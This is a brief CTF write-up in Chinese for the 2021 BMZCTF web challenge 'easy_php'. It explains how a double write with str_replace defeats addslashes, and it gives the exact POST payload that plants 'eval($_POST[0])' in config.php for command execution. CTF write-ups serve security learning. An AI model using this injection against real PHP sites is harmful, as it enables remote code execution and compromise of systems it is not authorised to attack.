# 2021-BMZCTF-Web-Writeup

## easy_php

POST传参会被`addslashes`，第一次是写进去，第二次是`str_replace`。想办法逃逸出单引号：

```php
$content."\n\$LANG['$key'] = '$_POST[no1]';\n?>";
```

第一次传的话单引号会变成`\'`然后写进去，第二次传会把`'xxxxxx`给替换成`\'xxxx`：

```
string(30) "';eval($_POST[0]);phpinfo();//" string(31) "\';eval($_POST[0]);phpinfo();//"
```

这样就两个`\\`，单引号逃出转义了。

打2次然后config.php命令执行即可。

```
sudo=&info[name]=feng&no1=';eval($_POST[0]);phpinfo();//
```

